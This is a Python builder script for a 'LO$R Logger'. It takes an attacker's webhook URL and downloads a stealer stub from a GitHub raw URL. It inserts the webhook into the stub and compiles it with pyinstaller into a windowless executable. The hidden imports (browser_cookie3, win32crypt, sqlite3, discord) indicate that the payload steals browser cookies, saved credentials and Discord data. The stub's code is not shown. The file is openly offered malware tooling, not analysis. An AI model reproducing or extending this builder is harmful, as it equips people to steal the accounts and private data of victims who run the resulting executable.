import marshal
import zlib
import requests
from pystyle import *
import os
import time
import shutil
os.system(f'cls & title LO$R Logger Builder!')
Write.Print(Center.XCenter("""
                                                                                                                        
\n"""), Colors.green_to_blue, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_blue, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.green_to_blue, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Is Not Working\n",Colors.green_to_blue, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.green_to_blue, interval=0.01)
code = requests.get("https://raw.githubusercontent.com/madhead341/LOSR-Logger/main/stubs/stub.py")
with open(f"{name}.py", 'w', encoding='utf8') as f:
    f.write(code.text.replace("webhooker", webhook))
Write.Print("LO$R Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
if compile == "y":
   os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="discord" --hidden-import="browser_cookie3" --hidden-import="shutil" --hidden-import="base64" --hidden-import="win32crypt" --hidden-import="shutil" --hidden-import="sqlite3" --hidden-import="psutil" --hidden-import="colorama" {name}.py')
   os.remove(f'{name}.spec')
   Write.Print("LO$R Logger Was SucessFully Complied In Dist Folder\n",Colors.green_to_blue, interval=0.01) 
   time.sleep(2)
   Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using LO$R Logger\n",Colors.green_to_blue, interval=0.01) 
   time.sleep(3)
   exit()
elif compile == "n":
   Write.Print("Thank You For Using LO$R Logger\n",Colors.green_to_blue, interval=0.01) 
   time.sleep(3)
   exit()
